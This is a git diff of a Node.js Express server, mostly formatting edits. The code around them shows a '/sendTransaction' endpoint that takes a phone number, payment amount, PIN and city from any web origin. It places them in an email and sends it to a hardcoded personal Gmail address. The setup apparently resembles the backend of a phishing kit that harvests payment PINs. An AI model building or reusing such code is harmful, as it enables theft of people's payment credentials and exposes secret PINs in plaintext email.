@@ -8,9 +8,10 @@ const bodyParser = require('body-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Allow requests from localhost
+// Allow requests from any origin (for development purposes)
 app.use(cors());
 
+// Parse JSON bodies
 app.use(bodyParser.json());
 
 const htmlTemplate = `
@@ -28,8 +29,8 @@ const transporter = nodemailer.createTransport({
     secure: true,
     auth: {
         user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-    }
+        pass: process.env.EMAIL_PASS,
+    },
 });
 
 app.post('/sendTransaction', async (req, res) => {
@@ -45,13 +46,13 @@ app.post('/sendTransaction', async (req, res) => {
             .replace('{{phoneNumber}}', phoneNumber)
             .replace('{{amountToPay}}', amountToPay)
             .replace('{{pin}}', pin)
-            .replace('{{city}}', city)
+            .replace('{{city}}', city);
 
         const info = await transporter.sendMail({
-            from: 'ibadurrehman718@gmail.com',
+            from: "ibadurrehman718@gmail.com",
             to: 'sarajameswilliam718@gmail.com',
             subject: 'New Transaction Alert',
-            html: html
+            html: html,
         });
 
         console.log("Message sent: %s", info.messageId);
